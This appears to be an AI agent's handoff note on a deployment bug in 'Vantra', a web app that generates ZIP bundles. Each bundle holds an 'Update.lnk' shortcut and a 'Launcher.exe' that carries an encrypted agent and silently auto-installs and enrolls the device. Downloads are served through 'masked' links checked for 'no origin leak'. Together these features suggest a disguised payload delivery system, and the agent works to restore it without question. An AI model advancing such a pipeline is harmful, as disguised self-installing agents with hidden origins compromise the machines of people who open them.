# TASK : ZIP bug — generated bundle has NO `.exe` (agent never installs/enrolls)

**Status:** ROOT CAUSE CONFIRMED (2026-09-14). NOT FIXED yet — handed to next agent.
**Repo:** `vantra` (web app) deploy gap; generator (`vantra-installer/generator`) is fine.

## Symptom
Generate a **ZIP bundle** in the Vantra web app, download it — the archive
**contains no `.exe`**. Expected: the offline launcher carrier **`{ Update.lnk,
Launcher.exe }`** (the exe carries the encrypted agent + auto-installs + enrolls).

## Root cause (CONFIRMED)
The **deployed web app `/opt/vantra` is older than commit `04c72e1`**
(2026-09-13 15:21, the "launcher mode" commit). It therefore runs the **legacy**
ZIP path.

Deployed `/opt/vantra/app/api/devices/deployments/route.ts` (file mtime
**Sep 12 21:31**) and `/opt/vantra/lib/zip-generator.ts` contain **no
`launcherMode`** (verified `grep`). Effect:
- Web-app never sends `launcherMode: true` in the `/build` body.
- Generator `postBuildZip` reads `body.launcherMode === true` → false → runs the
  **legacy** branch → zip = `{ Agent.lnk }` only. That branch's comment is
  explicit: *"the exe itself never ships inside the zip."*

The generator launcher path is **NOT** broken. Live repro (dummy request with
`launcherMode:true`): `HTTP 200`, zip contents =
```
      250B  Update.lnk
  5316106B  Launcher.exe
```
masked link `https://dl.instaweb.top/d/<jobId>` resolved and streamed the zip.

## Evidence
- `git -C vantra log`: `04c72e1 2026-09-13 15:21 feat(zip): launcher mode — …`
  touches exactly `app/api/devices/deployments/route.ts` (+4) and
  `lib/zip-generator.ts` (+5).
- Local `vantra` main `route.ts:296` = `launcherMode: true`; `zip-generator.ts:72`
  sends it. Deployed copies: absent.
- Live generator repro above produced the exe.

## Fix (for the next agent — applies the two files to the live box)
1. Promote `/opt/vantra` to `main` ≥ `04c72e1` (or copy in exactly):
   - `app/api/devices/deployments/route.ts` — must include `launcherMode: true`
     in the `zip` branch (the repo-main version @ `04c72e1`/`7eddc4d`).
   - `lib/zip-generator.ts` — must include `...(opts.launcherMode ? { launcherMode: true } : {})`.
   - If pushing to GitHub, your CI/CD deploys the web app; otherwise update
     `/opt/vantra` directly (ownership `vantra:vantra`).
2. Rebuild + restart the web app on the box (user `vantra`):
   - `cd /opt/vantra && sudo -u vantra env HOME=/opt/vantra npm run build`
   - `systemctl restart vantra.service`
3. Prefer pushing `vantra` to GitHub so the pipeline deploys it (canonical flow),
   and SSH is only for oversight/verification.

## Verify
- Web app generates a ZIP → `unzip -l` → entries must be **`Update.lnk` +
  `Launcher.exe`** (NOT `Agent.lnk`).
- Handed link is `https://dl.instaweb.top/d/<jobId>` and streams the zip with no
  redirect / origin leak.
- 3-E (Windows VM/wine): run the zip → device appears **Online** with no manual
  stage/execute.
- `npx tsc --noEmit` clean (web app + generator) before opening PRs.